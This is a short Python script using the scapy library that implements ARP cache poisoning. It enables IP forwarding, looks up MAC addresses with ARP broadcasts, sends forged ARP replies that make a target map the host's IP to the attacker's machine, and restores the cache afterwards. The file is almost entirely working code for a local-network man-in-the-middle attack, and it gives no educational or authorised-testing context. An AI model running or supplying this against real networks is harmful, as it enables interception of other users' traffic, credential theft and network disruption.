from scapy.all import *
from scapy.layers.l2 import ARP, Ether, arping


def ip_route(enable_status: str):
    print("Enable IP Routing")
    path = "/proc/sys/net/ipv4/ip_forward"
    with open(path, "w") as f:
        f.write(enable_status)


def get_mac_address(ip_address: str):
    """
    Returns MAC address of any device connected to the network given its IP address
    If ip was not found, returns None
    """
    try:
        answered_packets, unanswered_packets = srp(
            Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_address), timeout=3)
    except Exception as e:
        print(f"An error occurred while trying to send the ARP request: {e}")
        return None

    if answered_packets:
        return answered_packets[0][1].src

    print(f"No device with the IP address {ip_address} was found")
    return None


def arp_poisoning(target_mac, target_ip, host_ip, verbose=True):
    print("target_ip: ", target_ip, " host_ip:", host_ip)
    print("target_mac: ", target_mac)
    response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(response)


def restore(target_mac, host_mac, target_ip, host_ip):
    response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
    send(response, count=7)
